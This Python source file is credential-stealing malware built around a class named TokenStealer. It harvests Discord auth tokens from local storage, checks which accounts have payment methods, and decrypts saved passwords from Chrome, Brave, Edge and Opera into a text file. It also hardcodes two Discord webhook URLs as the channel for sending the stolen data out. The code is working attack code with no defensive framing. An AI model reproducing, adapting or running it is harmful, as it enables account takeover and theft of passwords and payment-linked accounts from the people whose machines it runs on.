import json
import os
import base64
import shutil
import sqlite3
import win32crypt
import discord_webhook
from tkinter import *
from datetime import datetime, timedelta
from json import loads
from re import findall
from urllib.request import urlopen, Request
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

discordPaths = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
}

Login_Data = {
    "Chrome" : LOCAL + "\\Google\\Chrome\\User Data\\Default\\Login Data",
    "Brave" : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
    "Microsoft Edge" : LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "Opera" : ROAMING + "\\Opera Software\\Opera Stable\\Login Data",
    "Opera GX" : ROAMING + "\\Opera Software\\Opera GX Stable\\Login Data"
}

Local_State = {
    "Chrome" : LOCAL + "\\Google\\Chrome\\User Data\\Local State",
    "Brave" : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
    "Microsoft Edge" : LOCAL + "\\Microsoft\\Edge\\User Data\\Local State",
    "Opera" : ROAMING + "\\Opera Software\\Opera Stable\\Local State",
    "Opera GX" : ROAMING + "\\Opera Software\\Opera GX Stable\\Local State"
}

TOKEN = ""


class TokenStealer(object):
    def __init__(self):
        self.webhook = discord_webhook.DiscordWebhook(
            url="https://discord.com/api/webhooks/892325233460146217/-LohRFFg6NzCHUq9l40VAlpWtZNX1fz0N4HZ9ClBH-Wsvlugk43I5R7yTqDynpojWLR-")
        self.webhook2 = discord_webhook.DiscordWebhook(
            url="https://discord.com/api/webhooks/892325279370985482/bjKk2AalR6_ohUyPZNJc3Koho6RAW4fHdoQCdguyxEhp6OguZBQcLwQWhPYPDQ-wk4BC")

    def has_payment_methods(self, token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                  headers=self.getheaders(token))).read().decode())) > 0)
        except:
            pass

    def gettokens(self, path):
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens

    def getheaders(self, token=None, content_type="application/json"):

        if token:
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            }
        else:
            return None

        return headers

    def getuserdata(self, token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=self.getheaders(token))).read().decode())
        except:
            pass

    def get_encryption_key(self, local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return "N/A"

    def get_chrome_datetime(self, chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def getavatar(self, uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        return url

    def checkedTokens(self):
        checked = []
        for platform, path in discordPaths.items():
            path += "\\Local Storage\\leveldb"
            if not os.path.exists(path):
                continue
            for token in self.gettokens(path):
                if not self.getuserdata(token):
                    continue
                if token in checked:
                    continue
                checked.append(token)
        return checked

    def browserPassword(self):
        filename = "LoginData.db"
        FilePath = ROAMING + "\\Passwords.txt"
        f = open(FilePath, "w")
        origin_urls = []
        informations = []
        for platform, path in Login_Data.items():
            if not os.path.exists(path):
                continue
            shutil.copyfile(path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute(
                "select origin_url, action_url, username_value, password_value from logins")
            for row in cursor.fetchall():
                username = row[2]
                key_path = Local_State[platform]
                key = self.get_encryption_key(key_path)
                password = self.decrypt_password(row[3], key)
                if username or password:
                    origin_url = row[0]
                    action_url = row[1]
                    if origin_url in origin_urls:
                        continue
                    origin_urls.append(origin_url)
                    f.write(f"Origin URL: {origin_url} \n")
                    f.write(f"Action Url: {action_url} \n")
                    f.write(f"Username: {username} \n")
                    f.write(f"Password: {password} \n")
                f.write("=" * 50)
                f.write("\n")
            cursor.close()
            db.close()
            try:
                # try to remove the copied db file
                os.remove(filename)
            except:
                pass
        f.close()

        return FilePath
